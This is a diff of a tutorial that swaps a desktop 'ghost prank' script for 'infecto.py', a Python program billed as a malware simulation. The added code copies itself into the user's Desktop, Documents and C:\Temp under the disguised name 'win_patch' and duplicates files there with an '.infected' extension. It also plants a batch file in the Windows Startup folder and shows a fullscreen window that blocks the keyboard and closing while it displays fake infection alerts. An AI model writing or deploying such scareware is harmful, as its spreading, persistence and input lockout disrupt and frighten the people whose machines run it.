@@ -1,11 +1,6 @@
-# Virus 1
-
-### Step 1: Make a new folder (in downloads folder) and name it malware
-
+## MALWARE
 
 ### Step 2: Setup your Virtual Environment
-
-Open VS Code of your project folder (which is the malware folder) and paste this:
 
 To activate:
 ```bash 
@@ -15,107 +10,168 @@ python -m venv venv
 ```bash
 venv\Scripts\activate
 ```
-
-Then move to your folder directory
-```bash
-cd virus1
-```
  ### Step 3: Install Required Libraries
 
 ```bash
-pip install pyautogui psutil pywin32 pygame
+pip install pygame
 ```
 
-### Step 4: ghost_prank.py
+### Step 4: infecto.py
 
 ```bash
-import os
-import random
-import time
-import pyautogui
-import psutil
-import win32gui
-import win32con
+import os, shutil, random, time, datetime, tkinter as tk, pygame
 from threading import Thread
-import pygame  # 🔊 For playing .wav sound
 
 # ===== CONFIG =====
-FOLDER_NAME = "GHOST_FOLDER"
-DELAY_SECONDS = 1
-DURATION_MINUTES = 2
-SHOW_FAKE_ERROR = True
+TARGET_DIRS = [
+    os.path.expanduser("~/Desktop"),
+    os.path.expanduser("~/Documents"),
+    "C:\\Temp"
+]
+FAKE_EXT = ".infected"
+ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
+SIM_DURATION = 20
+SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
 # ==================
 
-def show_fake_error():
-    """Shows a fake virus warning message and plays sound using pygame."""
+log = []
+
+def log_event(event, box=None):
+    ts = datetime.datetime.now().strftime("%H:%M:%S")
+    entry = f"[{ts}] {event}"
+    log.append(entry)
+    print(entry)
+    if box:
+        box.insert(tk.END, entry + "\n")
+        box.see(tk.END)
+
+def save_log():
+    """Save IOC log to Desktop after infection ends"""
+    try:
+        fname = os.path.join(SAVE_DIR, "infection_log.txt")
+        with open(fname, "w") as f:
+            for entry in log:
+                f.write(entry + "\n")
+        print(f"[+] Infection log saved at: {fname}")
+    except Exception as e:
+        print(f"[!] Could not save log: {e}")
+
+def spread_self(log_box=None):
+    exe_path = os.path.abspath(__file__)
+    for d in TARGET_DIRS:
+        try:
+            os.makedirs(d, exist_ok=True)
+            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
+            shutil.copy(exe_path, target)
+            log_event(f"Copied to {target}", log_box)
+        except Exception as e:
+            log_event(f"Spread failed: {e}", log_box)
+
+def infect_files(log_box=None):
+    for d in TARGET_DIRS:
+        try:
+            for fname in os.listdir(d):
+                fpath = os.path.join(d, fname)
+                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
+                    infected = fpath + FAKE_EXT
+                    shutil.copy(fpath, infected)
+                    log_event(f"File infected: {infected}", log_box)
+        except:
+            pass
+
+def simulate_persistence(log_box=None):
+    try:
+        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        os.makedirs(startup, exist_ok=True)
+        dummy = os.path.join(startup, "startup_infect.bat")
+        with open(dummy, "w") as f:
+            f.write("echo Fake persistence simulation - no real damage.")
+        log_event(f"Persistence simulated at: {dummy}", log_box)
+    except Exception as e:
+        log_event(f"Persistence failed: {e}", log_box)
+
+def play_alert():
     try:
         pygame.mixer.init()
-        pygame.mixer.music.load("C:/Users/rivan/Downloads/668981__vestibule-door__monster-loose-alarm.wav")
-        pygame.mixer.music.play()
+        pygame.mixer.music.load(ALARM_FILE)
+        pygame.mixer.music.play(-1)
+        print(f"[+] Playing sound from {ALARM_FILE}")
     except Exception as e:
-        print(f"Error playing sound: {e}")
+        log_event(f"Alert sound error: {e}")
 
-    win32gui.MessageBox(
-        0,
-        "WARNING: GHOSTWARE DETECTED!\n\nYour system is haunted by a rogue folder spirit. Do not interfere!",
-        "CRITICAL VIRUS ALERT",
-        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL
+# --- Fullscreen infection GUI ---
+def infection_screen():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg="black")
+    root.wm_attributes("-topmost", 1)
+
+    # disable exit + keyboard
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    root.bind_all("<Key>", lambda e: "break")
+    root.bind_all("<Alt-Key>", lambda e: "break")
+
+    warning = tk.Label(
+        root,
+        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
+        fg="red",
+        bg="black",
+        font=("Consolas", 42, "bold")
     )
+    warning.place(relx=0.5, rely=0.3, anchor="center")
 
-def create_folder():
-    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
-    folder_path = os.path.join(desktop, FOLDER_NAME)
-    os.makedirs(folder_path, exist_ok=True)
-    return folder_path
+    submsg = tk.Label(
+        root,
+        text="Do not turn off your computer.\nFiles are being corrupted...",
+        fg="yellow",
+        bg="black",
+        font=("Consolas", 20)
+    )
+    submsg.place(relx=0.5, rely=0.42, anchor="center")
 
-def move_folder(folder_path):
-    screen_width, screen_height = pyautogui.size()
-    while True:
-        try:
-            x = random.randint(0, screen_width - 100)
-            y = random.randint(0, screen_height - 100)
-            os.system(f'powershell.exe -command "$sh = New-Object -ComObject Shell.Application; $sh.Namespace(0).ParseName(\'{folder_path}\').InvokeVerb(\'move\')"')
-            pyautogui.moveTo(x, y, duration=0.5)
-            pyautogui.click()
-            time.sleep(DELAY_SECONDS)
-        except:
-            break
+    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
+    log_box.place(relx=0.5, rely=0.75, anchor="center")
 
-def is_explorer_running():
-    return "explorer.exe" in (p.name() for p in psutil.process_iter())
+    # Animation vars
+    direction = 1
+    y_pos = 0.3
+    start_time = time.time()
 
+    while time.time() - start_time < SIM_DURATION:
+        # Move the red warning up and down
+        y_pos += 0.003 * direction
+        if y_pos > 0.35 or y_pos < 0.25:
+            direction *= -1
+        warning.place(relx=0.5, rely=y_pos, anchor="center")
+
+        # Fake infection events
+        if random.random() < 0.25:
+            fake_event = random.choice([
+                "Injected into explorer.exe",
+                "Modified registry key HKCU\\Run",
+                "Spawned process: svchost32.exe",
+                "Spreading to Documents folder",
+                "Memory hook installed"
+            ])
+            log_event(fake_event, log_box)
+
+        root.update()
+        time.sleep(0.2)
+
+    root.destroy()
+    save_log()  
+
+# --- MAIN ---
 def main():
-    if not is_explorer_running():
-        print("Error: Windows Explorer must be running!")
-        return
-
-    folder_path = create_folder()
-    print(f"Ghost folder created at: {folder_path}")
-    print("Press CTRL+C to stop early.")
-
-    if SHOW_FAKE_ERROR:
-        Thread(target=show_fake_error, daemon=True).start()
-
-    Thread(target=move_folder, args=(folder_path,), daemon=True).start()
-
-    if DURATION_MINUTES > 0:
-        time.sleep(DURATION_MINUTES * 60)
-    else:
-        while True:
-            time.sleep(1)
+    Thread(target=spread_self, daemon=True).start()
+    Thread(target=infect_files, daemon=True).start()
+    Thread(target=simulate_persistence, daemon=True).start()
+    Thread(target=play_alert, daemon=True).start()
+    infection_screen()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\nPrank stopped by user.")
-    finally:
-        print("The ghost has been banished! Folder remains but won't move anymore.")
-```
+    main()
 
-### Step 5: Run ghost_prank.py
-```bash
-python ghost_prank.py
 ```
 
 Creating a Clickable Desktop Icon
